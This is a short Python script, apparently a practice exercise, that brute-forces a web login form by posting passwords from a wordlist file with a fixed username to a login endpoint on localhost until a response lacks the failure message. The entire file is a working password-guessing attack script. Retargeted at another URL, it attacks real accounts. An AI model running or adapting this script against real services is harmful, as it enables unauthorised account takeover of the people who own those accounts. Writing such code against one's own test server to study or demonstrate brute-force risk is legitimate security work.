import requests
import time
o=0
print('lib')
start_time = time.time()

wordslist = open ("qw.txt","r")
url = 'http://127.0.0.1:5000/login'

for line in wordslist :
    print ('trying passowrd: ',o)
    for word in line.split():
        x=word
    o=o+1
    login_data = {"username" :"yomamagai", "password":x}
    response = requests.post(url, data=login_data)

    if b"login faild." not  in response.content :
        print ("The user password has been found:"+ x)
        break 
if b"login faild."  in response.content :
    print ("Sorry cant find the password ")
print("--- %s seconds ---" % (time.time() - start_time))